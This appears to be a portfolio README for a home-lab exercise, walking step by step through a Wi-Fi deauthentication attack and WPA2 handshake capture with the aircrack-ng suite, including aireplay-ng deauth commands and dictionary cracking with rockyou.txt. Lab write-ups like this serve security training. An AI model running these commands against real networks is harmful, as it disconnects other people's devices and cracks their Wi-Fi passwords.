# Portfolio-DeauthAttack üîìüì°

This repository documents my **controlled Wi-Fi deauthentication (deauth) attack** and **WPA2 handshake capture** performed inside a **Kali Linux VM running on VMware Workstation Pro**. The exercise highlights how attackers can exploit unprotected 802.11 management frames to forcibly disconnect clients and capture WPA2 handshakes for offline password analysis. The purpose of this project is to provide a practical, hands-on example of both offensive wireless testing and defensive monitoring strategies. While the attack itself is disruptive, it also offers valuable lessons for defenders who need to recognize and mitigate such activity in real-world environments.

**The objective:** force a client on **my own test network** to disconnect, capture the WPA2 handshake, and crack a weak passphrase with the `aircrack-ng` suite.

> ‚ö†Ô∏è **Ethical Notice:** Performed only on a network I own, strictly for education and portfolio purposes. Do **not** test on networks without explicit authorization.

## üì∏ Step-By-Step Process (Commands + Evidence)

### 1) Detect Wireless Adapters
    iwconfig
Identify available interfaces before starting.

---

### 2) Enable Monitor Mode (Injection Adapter)
    sudo airmon-ng start wlan0
Enable monitor mode on the adapter dedicated to injection; this creates `wlan1mon`.

---

### 3) Scan Nearby Wi-Fi Networks (Discovery)
    sudo airodump-ng wlan0
Discover SSIDs/BSSIDs and confirm the target (**KC‚Äôs Mobile WPA2 Network**).

---

### 4) Target the Network and Capture the Handshake
    sudo airodump-ng --bssid <TARGET_BSSID> -c <CHANNEL> -w handshake wlan0
Lock onto the target AP on its channel and writes captured packets to `handshake-03.cap` using the listener interface.

---

### 5) Deauthenticate a Client (Trigger Handshake)
    sudo aireplay-ng --deauth 10 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan1mon
Send deauth frames from the injection adapter to force a reconnect, generating the WPA2 4-way handshake.

---

### 6) Crack the Captured Handshake
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <TARGET_BSSID> handshake-03.cap
Run a dictionary attack with `rockyou.txt` against the handshake capture.

## üñ•Ô∏è VMware & Hardware Notes

- **USB Passthrough:** Both **ALFA AWUS036ACM** adapters are attached directly to the guest VM for full monitor/injection support.  
- **Networking:** VM set to **NAT** for package updates; wireless adapters are **not** bridged as NICs‚Äîeach is passed through as a USB device to Kali.  
- **Driver Support:** Ensure chipset/driver support in Kali so `monitor` mode and injection function correctly.

---

## ‚úÖ Key Takeaways

- Practical use of monitor mode and packet injection to capture WPA2 handshakes in a controlled lab.

- Developed a clear understanding of BSSID (access point) vs. client MAC (station) roles during deauthentication attacks.

- Demonstrated a successful dictionary attack, highlighting the risks of weak Wi-Fi passphrases.

- Built a reliable virtualized lab environment using VMware Workstation Pro and ALFA AWUS036ACM USB adapters for wireless testing.
